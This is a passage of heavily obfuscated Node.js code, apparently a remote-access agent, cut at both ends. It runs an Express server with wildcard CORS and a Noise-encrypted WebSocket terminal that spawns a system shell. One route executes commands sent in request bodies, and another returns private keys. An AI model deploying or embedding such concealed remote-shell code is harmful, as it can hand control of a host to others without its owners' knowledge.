        'q2XVC2LUzYbJB25Uzwn0Aw9Uigr1zsb0BYbTAxnZAw5NihjLCxvLC3rFAwq',
        'y2XVC2u',
        'AgvHzgvYCW',
        'quDftLrFufjjvKfurv9lrvK',
        'z0fYt0K',
        'DhvUBMvSswq',
        'C3rVCa',
        'D2fYBMLUzW',
        'zw5KC1DPDgG',
        'CuD1qwK',
        'v0zWANe',
        'tMfStwu',
        'r0PzwfC',
        'wuDqzwC',
        'uxnAru4',
        'DMLYDhvHBgL6yxrPB24',
        'CgT2tNq',
        'uMzqBxe',
        'ywLzvK8',
        'C2v0vty0',
        'ndaW',
        'q1bNqLa',
        'D29Yzhm',
        'BKLurxa',
        'zMLUAxnO',
        'C2LNBMfS',
        'AxnbyNnVBhv0zq',
        'Dw5RBM93BIbLCNjVCG',
        'DhjPBvn0yxj0',
        'y2z0Dw5UzwWUANmVms4W',
        'ywDL',
        'zxHLy3v0zq',
        'w0Tnt0rfxsdWN5Er77IpiowFN+wqJEAwH+s7TUw3SUwiOoMzPdOG',
        'z2P3zK4',
        'zgf0zq',
        'x2DLDfzPCNr1ywXPEMf0Aw9U',
        'z2v0qwn0AxzLrwnPzxnqDwi',
        'u05mCNa',
        'ruzLz3O',
        'x3DHA2u',
        'sfHWr2e',
        'uuvmBfO',
        'zKvTBgK',
        'z2v0t25LDgLTzvrHC2TZ',
        'z055r3a',
        'A2vYBMvS',
        'mxWWFdn8nhW1Fdi',
        'y29UBMvJDa',
        'C0TxtKq',
        'Ewvbr1i',
        'ENfQDuy',
        'wNncquK',
        'u3fpEKS',
        'Dg90ywW',
        'zxrHzW',
        'DNvWzKC',
        'D3D3lwf1DgHLBNrPy2f0zq',
        'D2vIC29JA2v0',
        'D2fZBsbZDhjLyw1PBMCGy29TCgLSzsbMywLSzwq',
        'wM9eseW',
        'u0HbmJu2',
        'AM1Xq1y',
        'l2fWAs9MAwXLl2nHDa',
        'l2fWAs9ZDgf0Dxm',
        'EwLmEKu',
        'A2v5x3nVDxjJzq',
        'AuPerhK',
        'zxLk',
        'thDMB3O',
        'zuPVBuW',
        's3HkBeq',
        'BxvSDgKTC2vNBwvUDcbdyxaNBIbqCM90BYbTzxnZywDLigLZig5VDcbZDxbWB3j0zwq',
        'v1PVy0K',
        'y3HmANm',
        'zvzitLm',
        'zeH2Axu',
        'zMXVB3i',
        'q01usLa',
        'rhHdBLK',
        'A2XWsuy',
        'uMvZCg9UC2uGzw5JCNLWDgLVBIbMywLSzwq6ia',
        'zwnPzxnqDwjRzxK',
        'ChjPBNrLza',
        'w1DbuK5Die5VAxnLifDbu00GBw9KDwXLigzHAwXLzcb0BYbSB2fKoG',
        'y29VA2LL',
        'sfruuca',
        'uw5sqxm',
        'qMPfAMy',
        'teTwtw8',
        'yxbWBgLJyxrPB24VANnVBJSGy2HHCNnLDd11DgyToa',
        'su5gtW',
        'tefNtw0',
        'yM9KEq',
        'Ag9ZDg5HBwu',
        'C2v0q3jVBLrHC2TZ',
        'rur4wKO',
        'quT6sLi',
        'EeTsue8',
        'ChjVy2vZCW',
        'x3rHC2TRAwXSvhjLzq',
        'vKrTAeG',
        'EYjZCMmIoIjVCMLNAw4IlcjMBg93x3jHDgvFBgLTAxrLzci6zMfSC2v9',
        'icHltKfnrt0',
        'B3bLBKnVBNrYB2W',
        'vevstq',
        'uKTLA3y',
        'C1b4tNe',
        'DxnLCI1Hz2vUDa',
        'CgLWzq',
        'ufvu',
        'Ec1LBMnYExb0zwqSihGTywDLBNqTDMvYC2LVBIWGEc1MAwXLlxnPEMuSihGTB3jPz2LUywWTCgf0Aa',
        'zgvJB2rL',
        'Cgf0Aa',
        'zMjvCwm',
        'y3jLyxrLzef0',
        'ChjVEhKTyxv0AgvUDgLJyxrL',
        'yKrwC3O',
        'y2f0y2G',
        'B25LDgLTzxrHC2TZx2XVzW',
        'vuXbzuy',
        'CMvHzgXPBMu',
        'm3WYFdb8nhWX',
        'D1H0D0G',
        'u0D2qvi',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'EKPXCfa',
        'wfvKDhO',
        'yMfZzty0DxjS',
        'lcbZCgvJAwz5ihr1BM5LBf9KB21HAw4GDg8GzgLZyw1IAwD1yxrL',
        'zuLbyuO',
        'zuzWDvq',
        'dqOncG',
        'qxfIDLi',
        'shjIzwC',
        'Ec1Hz2vUDc12zxjZAw9U',
        'EwPXuxa',
        'qNDksu0',
        'Aw52ywXPzcbtrvrusu5huYbWyxLSB2fK',
        'qNP6ELi',
        'DuT6yvG',
        'uM1Kwei',
        'A09xtgW',
        'DJeUma',
        'B3jPz2LUig11C3qGyMuGyw4GAhr0CdOVlYbVCIbODhrWCZOVlYbvuKW',
        'B25LDgfZA3m',
        'AMjpt0C',
        'rurLrLi',
        'y29WEuzPBgvtEw5J',
        'yNPKELC',
        'uxrmA3u',
        'sw52ywXPzcbIB2r5igzVCM1HDdOG',
        'z2v0tg9Nu3vTBwfYEq',
        'y01YDvG',
        'r2v0qwn0Aw9U',
        'Chr5uhjVy2vZCW',
        'y29UDgvUDa',
        'C29YDa',
        'sKriyMO',
        'zNntAxPL',
        'rfDpuue',
        'CMvNAxn0CMf0Aw9UihvUAw9Uia',
        'y3H1s0y',
        'B25eyxrH',
        'C2HLBgW',
        'CxbSt2e',
        'v0fstG',
        'BKz4EuG',
        'u0riyNi',
        'z2v0q3jVBLrHC2TZ',
        'qvDivu4',
        'ufjptvbux0nptu1btKq',
        'ntbTyG',
        'ugHnDuG',
        't1bftG',
        'zgj4twi',
        'vwL0Bwe',
        'Aw5MBW',
        'EKTot1y',
        'qw5lC3G',
        'wMfxEvG'
    ];
    a0a = function () {
        return fM;
    };
    return a0a();
}
class a0aL {
    constructor(a, b, c) {
        const eN = a0aQ, d = { 'AcFlw': eN(0x37b) }, f = d[eN(0x77a)][eN(0x316)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[eN(0x1e5)] = null;
                continue;
            case '1':
                this[eN(0x2f7)] = c;
                continue;
            case '2':
                this[eN(0x2c6)] = 0x0;
                continue;
            case '3':
                this['_onDataCb'] = null;
                continue;
            case '4':
                this[eN(0x6dd)] = a;
                continue;
            case '5':
                this['_onExitCb'] = null;
                continue;
            case '6':
                this[eN(0x774)] = b;
                continue;
            }
            break;
        }
    }
    [a0aQ(0x526)]() {
        const eO = a0aQ, a = {
                'umULc': function (c, d) {
                    return c || d;
                },
                'eFpuT': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'lKMuQ': eO(0x6a6),
                'EURPk': eO(0x45f)
            };
        this[eO(0x1e5)] = a[eO(0x6bc)](a0r, this[eO(0x6dd)], [], {
            'env': this[eO(0x774)],
            'cwd': this[eO(0x2f7)],
            'windowsHide': !![],
            'stdio': [
                a[eO(0x428)],
                a[eO(0x428)],
                'pipe'
            ]
        }), this['pid'] = this[eO(0x1e5)]['pid'] || 0x0;
        const b = this;
        this[eO(0x1e5)][eO(0x19b)]['on'](eO(0x576), c => b['_emitData'](c)), this[eO(0x1e5)]['stderr']['on'](eO(0x576), c => b[eO(0x196)](c)), this['proc']['on'](a['EURPk'], (c, d) => {
            const eP = eO;
            if (b[eP(0x156)])
                b['_onExitCb']({
                    'exitCode': c,
                    'signal': a[eP(0x5a5)](d, null)
                });
        });
    }
    [a0aQ(0x196)](a) {
        const eQ = a0aQ, b = { 'coJnC': eQ(0x448) };
        if (this[eQ(0x23a)])
            this[eQ(0x23a)](a[eQ(0x496)](b['coJnC']));
    }
    [a0aQ(0x6dc)](a) {
        return this['_onDataCb'] = a, {
            'dispose': () => {
                const eR = a0b;
                this[eR(0x23a)] = null;
            }
        };
    }
    [a0aQ(0x10c)](a) {
        const eS = a0aQ;
        return this[eS(0x156)] = a, {
            'dispose': () => {
                const eT = eS;
                this[eT(0x156)] = null;
            }
        };
    }
    [a0aQ(0x1f8)](a) {
        const eU = a0aQ;
        if (!this['proc'] || !this['proc'][eU(0x5ab)])
            return;
        try {
            this[eU(0x1e5)][eU(0x5ab)][eU(0x1f8)](a);
        } catch (b) {
        }
    }
    [a0aQ(0x47d)]() {
    }
    [a0aQ(0x60b)]() {
        const eV = a0aQ;
        try {
            if (this['proc'])
                this[eV(0x1e5)][eV(0x60b)]();
        } catch (a) {
        }
    }
}
class a0aM {
    constructor() {
        const eW = a0aQ, a = {
                'gawZA': eW(0x31a),
                'MVwkM': 'handshake'
            }, b = a[eW(0xc6)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[eW(0x4f2)] = a[eW(0xca)];
                continue;
            case '1':
                this[eW(0x545)] = [];
                continue;
            case '2':
                this['useNoise'] = !![];
                continue;
            case '3':
                this[eW(0x6d4)] = null;
                continue;
            case '4':
                this[eW(0x570)] = [];
                continue;
            case '5':
                this[eW(0x5eb)] = a0O[eW(0x5ea)]['control'][eW(0x5ae)];
                continue;
            case '6':
                this[eW(0x63d)] = a0O[eW(0x5ea)][eW(0x411)][eW(0x340)];
                continue;
            case '7':
                this[eW(0x223)] = null;
                continue;
            case '8':
                this['websocket'] = null;
                continue;
            case '9':
                this[eW(0x325)] = new a0aK(![], this[eW(0x63d)], this[eW(0x5eb)]);
                continue;
            }
            break;
        }
    }
    async [a0aQ(0x703)]() {
        const eX = a0aQ, a = {
                'ZGBcK': function (b, c) {
                    return b === c;
                },
                'gKhkA': function (b, c) {
                    return b === c;
                }
            };
        this[eX(0x223)] && a0C[eX(0x6ea)]('[' + this[eX(0x223)] + eX(0x5fa));
        if (this[eX(0x6d4)]) {
            a[eX(0xf6)](process[eX(0x3f7)], eX(0x311)) && this[eX(0x6d4)][eX(0x2c6)] && this[eX(0x69d)](this[eX(0x6d4)]['pid']);
            try {
                this[eX(0x6d4)][eX(0x60b)]();
            } catch (b) {
            }
            this[eX(0x6d4)] = null;
        }
        if (this[eX(0x325)])
            this[eX(0x325)]['free']();
        if (this['websocket'])
            try {
                a[eX(0x343)](this[eX(0x673)][eX(0x529)], this['websocket'][eX(0x6e7)]) && this['websocket'][eX(0x63b)](0x3e8, eX(0x5ce));
            } catch (c) {
            } finally {
                this[eX(0x673)] = null;
            }
    }
    [a0aQ(0x69d)](a) {
        const eY = a0aQ, b = {
                'WqExH': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[eY(0x1a6)](a0q, eY(0x47e) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0aQ(0x3ee)](a) {
        const eZ = a0aQ, b = {
                'bzdzW': function (c, d) {
                    return c === d;
                },
                'bDIDR': function (c, d) {
                    return c > d;
                },
                'CiEfb': function (c, d) {
                    return c(d);
                },
                'dHviu': eZ(0x2db)
            };
        if (b[eZ(0x6ce)](this[eZ(0x4f2)], eZ(0x284))) {
            if (b[eZ(0x292)](this[eZ(0x545)][eZ(0x4a5)], 0x0)) {
                const c = this[eZ(0x545)]['shift']();
                b[eZ(0x3c1)](c, a);
            } else
                this['msgQueue']['push'](a);
        } else
            this[eZ(0x4f2)] === b[eZ(0x685)] && this[eZ(0x192)](a);
    }
    async [a0aQ(0x71b)]() {
        const f0 = a0aQ, a = {
                'yeAGR': function (b, c) {
                    return b > c;
                }
            };
        if (a[f0(0x66b)](this[f0(0x570)][f0(0x4a5)], 0x0))
            return this[f0(0x570)][f0(0xb8)]();
        return new Promise(b => {
            const f1 = f0;
            this[f1(0x545)][f1(0x33a)](b);
        });
    }
    async [a0aQ(0xf2)](a) {
        const f2 = a0aQ, b = {
                'qplOa': function (c, d) {
                    return c(d);
                },
                'UzJAn': f2(0x40d),
                'wXtwH': f2(0x630),
                'WgBAL': '加密握手失败'
            };
        b[f2(0x6de)](a, b[f2(0x47a)]);
        try {
            await this['cipher']['init']();
            const c = await this[f2(0x71b)](), d = this[f2(0x325)][f2(0x5ad)](c);
            d && d['length'] > 0x0 && this[f2(0x673)][f2(0x3a1)](d);
            const f = await this['_receiveWsBytes']();
            this[f2(0x325)][f2(0x5ad)](f);
            if (!this[f2(0x325)][f2(0x26e)])
                throw new Error(f2(0x17f));
            b['qplOa'](a, b[f2(0x6b4)]);
        } catch (g) {
            b[f2(0x6de)](a, f2(0x770) + g[f2(0x322)]);
            throw new Error(b['WgBAL']);
        }
    }
    [a0aQ(0x10d)]() {
        const f3 = a0aQ, a = {
                'fWgGd': f3(0x311),
                'OQDXa': 'C:\x5cWindows',
                'amiWj': f3(0x5fe),
                'cZRrD': f3(0x6c8),
                'eYGTR': f3(0x374),
                'ncJUu': f3(0x569),
                'hrXiB': f3(0x627),
                'sOWMe': f3(0x277),
                'beVIY': f3(0x530),
                'ifoMm': f3(0xfb)
            };
        if (process['platform'] === a[f3(0x5d7)]) {
            const d = process.env.SystemRoot || a['OQDXa'], f = [
                    a0n['join'](d, a[f3(0x718)], f3(0x53f), a['cZRrD'], a['eYGTR']),
                    process.env.COMSPEC,
                    a0n['join'](d, f3(0x5fe), a[f3(0x5c6)])
                ];
            for (const g of f) {
                if (g && a0l[f3(0x124)](g))
                    return g;
            }
            return a[f3(0x5c6)];
        }
        const b = [
            a[f3(0x4ee)],
            a[f3(0x2d5)],
            a[f3(0x377)]
        ];
        for (const h of b) {
            if (a0l[f3(0x124)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[f3(0x124)](c))
            return c;
        return a['ifoMm'];
    }
    async [a0aQ(0x116)](a, b, c) {
        const f4 = a0aQ, d = {
                'exrPu': function (g, h) {
                    return g(h);
                },
                'YhUKI': '🔗\x20检测到\x20WS\x20连接，启用\x20Noise\x20加密',
                'dvUjO': f4(0x5d1),
                'EFegz': f4(0x322),
                'MFBOT': function (g, h) {
                    return g(h);
                }
            };
        this[f4(0x673)] = a, this['requestId'] = b;
        const f = g => a0C['info'](f4(0xdb) + b + ']\x20' + g);
        this[f4(0x13b)] = !c, d[f4(0x32f)](f, this[f4(0x13b)] ? d[f4(0xdc)] : d[f4(0x20a)]), a['on'](d[f4(0x660)], g => this['_handleRawMessage'](g));
        try {
            this['useNoise'] && await this[f4(0xf2)](f), await this['_runTerminal'](f);
        } catch (g) {
            d['MFBOT'](f, f4(0x771) + g[f4(0x322)]), await this['cleanup']();
        }
    }
    async [a0aQ(0x58a)](a) {
        const f5 = a0aQ, b = {
                'QzQdk': f5(0x448),
                'CDcbW': function (g, h) {
                    return g === h;
                },
                'eIAaJ': function (g, h) {
                    return g(h);
                },
                'yeqBD': function (g, h) {
                    return g(h);
                },
                'Nwtez': f5(0x361),
                'syZYP': function (g) {
                    return g();
                },
                'zJFlt': function (g, h) {
                    return g(h);
                },
                'Abyte': f5(0x26d),
                'QnhiQ': f5(0x2db),
                'TJrFB': function (g, h) {
                    return g > h;
                },
                'amYVF': f5(0x63b),
                'oXjQz': function (g, h) {
                    return g(h);
                }
            }, c = this[f5(0x10d)]();
        b['yeqBD'](a, '🐚\x20使用\x20Shell\x20路径:\x20' + c);
        const d = Object['assign']({}, process.env);
        delete d[f5(0x6e4)], d[f5(0x6a2)] = b[f5(0x1b2)];
        if (!d['LANG'])
            d['LANG'] = f5(0x175);
        const f = b['syZYP'](a0D);
        try {
            const g = {
                'name': 'xterm-256color',
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (b[f5(0x1c3)](process['platform'], 'win32'))
                try {
                    this['ptyProcess'] = a0B[f5(0x526)](c, [], g);
                } catch (h) {
                    a(f5(0x153) + h[f5(0x322)]), this[f5(0x6d4)] = new a0aL(c, d, f), this['ptyProcess'][f5(0x526)]();
                }
            else
                this[f5(0x6d4)] = a0B['spawn'](c, [], g);
            b[f5(0x115)](a, f5(0x44d) + (this[f5(0x6d4)]['pid'] || b[f5(0x5af)]) + ')'), this['phase'] = b['QnhiQ'];
            while (b[f5(0x117)](this[f5(0x570)][f5(0x4a5)], 0x0)) {
                const i = this[f5(0x570)][f5(0xb8)]();
                this[f5(0x192)](i);
            }
            this['ptyProcess']['onData'](j => {
                const f6 = f5;
                try {
                    let k = Buffer['from'](j, b[f6(0x45e)]);
                    this['useNoise'] && this['cipher'] && this['cipher'][f6(0x26e)] && (k = this['cipher'][f6(0x4ca)](k)), b[f6(0x1c3)](this[f6(0x673)][f6(0x529)], 0x1) && this[f6(0x673)][f6(0x3a1)](k);
                } catch (l) {
                }
            }), this[f5(0x6d4)][f5(0x10c)](({
                exitCode: j,
                signal: k
            }) => {
                const f7 = f5;
                b[f7(0x6bb)](a, f7(0x28d) + j + f7(0x17d) + k + ')'), this['cleanup']();
            }), this[f5(0x673)]['on'](b[f5(0x716)], () => {
                const f8 = f5;
                a(f8(0x30f)), this[f8(0x703)]();
            });
        } catch (j) {
            b[f5(0x5c9)](a, '💥\x20启动终端失败:\x20' + j[f5(0x322)]), await this[f5(0x703)]();
            throw j;
        }
    }
    ['_processTerminalMessage'](a) {
        const f9 = a0aQ, b = {
                'xzqsJ': f9(0x448),
                'LQWyM': function (c, d) {
                    return c === d;
                },
                'KqyzK': 'heartbeat',
                'StlYl': f9(0x47d),
                'ieejQ': f9(0x21f),
                'DAXSQ': f9(0x4d6)
            };
        if (!this[f9(0x6d4)])
            return;
        try {
            const c = Buffer[f9(0x3e1)](a);
            let d;
            this[f9(0x13b)] ? d = this['cipher'][f9(0x775)](c) : d = c;
            let f = ![], g = d[f9(0x496)](b[f9(0x512)]);
            if (g['trim']()['startsWith']('{'))
                try {
                    const h = JSON[f9(0x4b2)](g);
                    f = !![];
                    if (b[f9(0x459)](h['type'], b[f9(0x113)])) {
                        let i = Buffer[f9(0x3e1)](JSON[f9(0x769)]({ 'type': b[f9(0x113)] }));
                        if (this[f9(0x13b)])
                            i = this[f9(0x325)][f9(0x4ca)](i);
                        this['websocket']['send'](i);
                        return;
                    }
                    if (h['type'] === b[f9(0x104)]) {
                        this[f9(0x6d4)][f9(0x47d)](h[f9(0x162)] || 0x50, h[f9(0x255)] || 0x18);
                        return;
                    }
                    if (h[f9(0x6ef)] === b['ieejQ'] && h['data'] !== undefined) {
                        let j = h[f9(0x6fe)] === f9(0x4d6) ? Buffer[f9(0x3e1)](h[f9(0x576)], b['DAXSQ'])['toString'](b['xzqsJ']) : h['data'];
                        this[f9(0x6d4)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[f9(0x6d4)][f9(0x1f8)](d[f9(0x496)](b[f9(0x512)]));
        } catch (l) {
            a0C[f9(0x6ea)](f9(0xdb) + this[f9(0x223)] + ']\x20⚠️\x20指令处理异常:\x20' + l[f9(0x322)]);
            if (this[f9(0x13b)])
                this[f9(0x703)]();
        }
    }
}
async function a0aN(a = {}) {
    const fa = a0aQ, b = {
            'Cdvfx': 'Access-Control-Allow-Origin',
            'Nnfjn': fa(0x3a0),
            'RSFsw': fa(0x2d0),
            'Bwsgd': fa(0x6a8),
            'vzFET': function (c, d) {
                return c === d;
            },
            'NalMe': fa(0x609),
            'mTqCM': fa(0x58e),
            'wGFsO': fa(0x2be),
            'kaDYu': function (c) {
                return c();
            },
            'ZSEuo': function (c, d) {
                return c / d;
            },
            'ajVMi': function (c, d) {
                return c > d;
            },
            'lusgM': function (c, d) {
                return c - d;
            },
            'aCnsK': fa(0x216),
            'jPPmJ': function (c, d) {
                return c === d;
            },
            'fzJxy': fa(0x5e4),
            'NgeWg': function (c, d) {
                return c !== d;
            },
            'xzEVc': function (c, d) {
                return c < d;
            },
            'BHDHv': function (c, d) {
                return c > d;
            },
            'sWcBC': function (c, d) {
                return c(d);
            },
            'vfHdf': function (c, d) {
                return c / d;
            },
            'seNGg': function (c, d) {
                return c / d;
            },
            'BtgOk': function (c, d) {
                return c - d;
            },
            'ahFOr': fa(0x35c),
            'GBDRx': fa(0x33e),
            'csTCm': fa(0x42b),
            'skYNu': fa(0x6f3),
            'QyvIc': function (c, d) {
                return c(d);
            },
            'Hrbeg': fa(0x3b5),
            'ivYpa': function (c, d) {
                return c(d);
            },
            'sSJph': fa(0x30a),
            'vfYxI': function (c, d) {
                return c || d;
            },
            'rVPSY': fa(0x396),
            'jRmXH': function (c, d, f) {
                return c(d, f);
            },
            'STwnC': fa(0x604),
            'tIVWo': fa(0x1a7),
            'IYqyc': 'x-original-path',
            'QvJBG': fa(0x549),
            'JCKyQ': 'application/octet-stream',
            'btvMf': function (c, d, f) {
                return c(d, f);
            },
            'NOMJm': function (c, d, f) {
                return c(d, f);
            },
            'JbBTC': function (c, d) {
                return c(d);
            },
            'YjcjV': function (c, d) {
                return c(d);
            },
            'ECyUE': fa(0x710),
            'hYKga': function (c, d) {
                return c === d;
            },
            'EDMuD': function (c, d) {
                return c === d;
            },
            'siHHL': function (c, d) {
                return c ?? d;
            },
            'ODqjx': fa(0x393),
            'TKeqg': function (c, d) {
                return c === d;
            },
            'LVWmD': function (c, d) {
                return c(d);
            },
            'ozXeM': fa(0x448),
            'afjKg': fa(0x1f0),
            'oaEdk': 'Server\x20listening\x20successfully',
            'DwcNz': function (c, d) {
                return c === d;
            },
            'jmqCV': fa(0x2a8),
            'epxcP': fa(0x527),
            'ytAZf': fa(0x19e),
            'QVFrT': fa(0x23b),
            'rfFsu': 'Validating\x20config...',
            'CUBQg': 'CryptoManager\x20initialized',
            'BiVaw': fa(0x573),
            'PMIev': '\x20\x20\x20请检查\x20ECDSA_PUBKEY\x20环境变量或\x20keys/agent_ecdsa_pub.pem\x20是否为合法\x20P-256\x20公钥\x20(PEM\x20或\x2033\x20字节压缩\x20Base64)',
            'doGNw': 'Initializing\x20TempKeyManager...',
            'AlUJt': fa(0x71c),
            'jqtqZ': function (c, d) {
                return c(d);
            },
            'rvjQm': fa(0x6e5),
            'HJJXz': function (c, d, f) {
                return c(d, f);
            },
            'gGujH': fa(0x51a),
            'WHPDU': fa(0x637),
            'NprTw': fa(0x679),
            'EDMEV': fa(0x5a6),
            'QDMCV': fa(0x678),
            'qWwfW': fa(0x329),
            'dASSJ': fa(0x2d3),
            'PSwXD': fa(0x2ec),
            'JrliN': fa(0x705),
            'qYbAV': fa(0x25d),
            'TwhDf': fa(0x219),
            'vIkil': fa(0x4d9),
            'cxuKF': fa(0x344),
            'TISkN': fa(0x2a4),
            'ZsyyT': fa(0x2de),
            'csOAl': fa(0x129),
            'iMJHx': fa(0x379),
            'kHeCg': 'Setting\x20up\x20WebSocket\x20terminal\x20route...',
            'BVUaA': fa(0x61a),
            'iJDDy': fa(0x62e),
            'qyqms': fa(0x2e2)
        };
    try {
        const c = await import(b['epxcP']);
        a0z = c[fa(0x17b)];
        const d = await import(b[fa(0x369)]);
        a0A = d[fa(0x220)], a0C['debug'](b[fa(0x2c0)]), a0O[fa(0x59f)](a), a0C[fa(0x1cc)](b[fa(0x180)]), a0O[fa(0x370)](), a0C[fa(0x1cc)]('Config\x20validated'), a0C[fa(0x1cc)]('Initializing\x20CryptoManager...');
        const f = new a0Q(a0O[fa(0x26b)], a0O[fa(0x356)]);
        a0C[fa(0x1cc)](b[fa(0x4cb)]);
        !a0O[fa(0x2ae)] && !f[fa(0x365)] && (a0C[fa(0x5e4)](b[fa(0x4de)]), a0C[fa(0x5e4)](b[fa(0x553)]), process[fa(0x45f)](0x1));
        a0C['debug'](b[fa(0x372)]);
        const g = new a0P();
        g[fa(0x150)] = () => a0O['rotateOperationalSecrets'](), a0C[fa(0x1cc)](fa(0x380)), a0C[fa(0x1cc)](b[fa(0x35b)]);
        const h = new a0T();
        a0C[fa(0x1cc)](fa(0x2ab)), a0C[fa(0x1cc)]('Creating\x20Express\x20app...');
        const i = b[fa(0x5e2)](a0f);
        b['jqtqZ'](a0w, i), a0C['debug']('Express\x20app\x20created\x20and\x20expressWs\x20applied'), i[fa(0x227)]((m, n, o) => {
            const fb = fa;
            n[fb(0x4ec)](b[fb(0x258)], '*'), n[fb(0x4ec)](fb(0x75f), 'GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS'), n[fb(0x4ec)]('Access-Control-Allow-Headers', b[fb(0x342)]), n[fb(0x4ec)](b[fb(0x542)], b[fb(0x43e)]);
            if (b['vzFET'](m[fb(0x1c9)], b[fb(0x645)]))
                return a0O[fb(0x2ae)] && n[fb(0x5de)](b[fb(0xd1)], b['wGFsO']), n['status'](0xc8)[fb(0x4e5)]();
            b[fb(0x5e2)](o);
        }), i['use'](a0f[fa(0x289)]({
            'type': m => m[fa(0x6aa)] !== fa(0x2d3),
            'limit': b[fa(0x39d)]
        })), i['use'](a0f[fa(0x481)]({ 'extended': !![] })), i[fa(0x227)](b[fa(0x2a1)](a0S, f, g)), a0C[fa(0x1cc)](fa(0x280)), i[fa(0x514)](b[fa(0x484)], async (m, n) => {
            const fc = fa, o = {
                    'kBDaz': function (p, q) {
                        return b['ZSEuo'](p, q);
                    }
                };
            try {
                const p = Math['floor'](b['ZSEuo'](Date[fc(0x5bd)](), 0x3e8));
                !a0O[fc(0xab)] || b[fc(0x423)](b[fc(0x5dd)](p, a0O[fc(0x1f2)]), a0O[fc(0x2c4)]) ? (!a0O['_baseinfo_fetch_promise'] && (a0O[fc(0x747)] = h[fc(0x5c5)]()[fc(0x734)](r => {
                    const fd = fc;
                    return a0O[fd(0xab)] = r, a0O[fd(0x1f2)] = Math[fd(0x686)](o[fd(0x61d)](Date['now'](), 0x3e8)), a0O[fd(0x747)] = null, a0C[fd(0x1cc)](fd(0x1d3)), r;
                })[fc(0x6af)](r => {
                    const fe = fc;
                    a0O[fe(0x747)] = null;
                    throw r;
                })), await a0O[fc(0x747)]) : a0C[fc(0x1cc)](b[fc(0x41f)]);
                const q = { ...a0O[fc(0xab)] };
                b[fc(0x3af)](m[fc(0x114)], !![]) ? (q['session_key'] = a0O['SESSION_KEY'], q[fc(0x37d)] = a0O[fc(0xbe)]) : (q[fc(0x1d7)] = null, q[fc(0x37d)] = null), n[fc(0x493)](q), a0O[fc(0x3f5)] === '1' && a0aG['onBaseinfoSuccess']();
            } catch (r) {
                n[fc(0x261)](0x1f4)[fc(0x493)]({
                    'status': b[fc(0x16c)],
                    'message': r[fc(0x322)]
                });
            }
        }), i[fa(0x514)](b[fa(0x34d)], (m, n) => {
            const ff = fa;
            let o = a0O[ff(0x582)];
            if (b['NgeWg'](m[ff(0x1c0)][ff(0x308)], undefined)) {
                const r = parseInt(m[ff(0x1c0)][ff(0x308)], 0xa);
                if (Number[ff(0x43a)](r) || b[ff(0x43d)](r, 0x1) || b[ff(0x2b6)](r, a0O[ff(0x568)]))
                    return n[ff(0x261)](0x1a6)[ff(0x493)]({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0O[ff(0x568)] });
                o = r;
            }
            const p = g[ff(0x4d8)](o), q = s => new Date(s * 0x3e8)[ff(0x4f9)]()[ff(0x4c2)](ff(0x4e0), 'Z');
            n['json']({
                'status': 'ok',
                'key_id': p[ff(0x3d7)],
                'ttl_seconds': p[ff(0x60c)],
                'created_at': b[ff(0x50d)](q, p[ff(0x4fe)]),
                'expires_at': q(p[ff(0x5d4)]),
                'ecdsa': {
                    'private_key': p[ff(0x3f2)][ff(0x5d6)](),
                    'public_key': p[ff(0x3cb)][ff(0x5d6)]()
                },
                'ecies': {
                    'private_key': p[ff(0x6b6)],
                    'public_key': p[ff(0x53c)]
                }
            });
        }), i[fa(0x514)](b[fa(0xe8)], async (m, n) => {
            const fg = fa, o = {
                    'DySbt': function (p, q) {
                        return b['vfHdf'](p, q);
                    },
                    'MVHOn': fg(0x565)
                };
            try {
                const p = Math[fg(0x686)](b[fg(0x442)](Date[fg(0x5bd)](), 0x3e8));
                !a0O[fg(0x3db)] || b['BHDHv'](b[fg(0x48b)](p, a0O['_status_cache_time']), a0O[fg(0x178)]) ? (!a0O[fg(0x502)] && (a0O[fg(0x502)] = h[fg(0x35e)]()[fg(0x734)](r => {
                    const fh = fg;
                    return a0O[fh(0x3db)] = r, a0O[fh(0x592)] = Math[fh(0x686)](o[fh(0x2e0)](Date[fh(0x5bd)](), 0x3e8)), a0O['_status_fetch_promise'] = null, a0C['debug'](o[fh(0x12f)]), r;
                })[fg(0x6af)](r => {
                    const fi = fg;
                    a0O[fi(0x502)] = null;
                    throw r;
                })), await a0O[fg(0x502)]) : a0C[fg(0x1cc)](b[fg(0x751)]);
                const q = { ...a0O[fg(0x3db)] };
                n[fg(0x493)](q);
            } catch (r) {
                n['status'](0x1f4)['json']({
                    'status': 'error',
                    'message': r['message']
                });
            }
        }), i[fa(0x139)](fa(0x20f), async (m, n) => {
            const fj = fa;
            try {
                let o = null;
                if (b['jPPmJ'](typeof m[fj(0x696)], b[fj(0x589)]))
                    o = m['body'][fj(0x5d6)]();
                else
                    m[fj(0x696)] && b[fj(0x3af)](typeof m[fj(0x696)], b[fj(0x327)]) && (o = m[fj(0x696)][fj(0x708)] || '');
                if (!o)
                    return n[fj(0x261)](0x190)[fj(0x493)]({
                        'status': b['fzJxy'],
                        'message': b[fj(0x6f8)]
                    });
                const p = await a0U[fj(0x659)](o, {
                    'cwd': m[fj(0x696)][fj(0x2f7)],
                    'env': m[fj(0x696)][fj(0x774)],
                    'timeout': a0O[fj(0x5be)]
                });
                n['json'](p);
            } catch (q) {
                n[fj(0x261)](0x1f4)[fj(0x493)]({
                    'status': fj(0x5e4),
                    'message': q[fj(0x322)]
                });
            }
        }), i['post'](b['EDMEV'], async (m, n) => {
            const fk = fa;
            try {
                const o = await a0W[fk(0x727)](m[fk(0x696)][fk(0x6aa)], m[fk(0x696)][fk(0x24d)]);
                n[fk(0x493)]({
                    'status': 'ok',
                    'count': o['length'],
                    'files': o
                });
            } catch (p) {
                n['status'](0x1f4)[fk(0x493)]({
                    'status': b[fk(0x16c)],
                    'message': p[fk(0x322)]
                });
            }
        }), i[fa(0x139)](fa(0x3a5), async (m, n) => {
            const fl = fa;
            try {
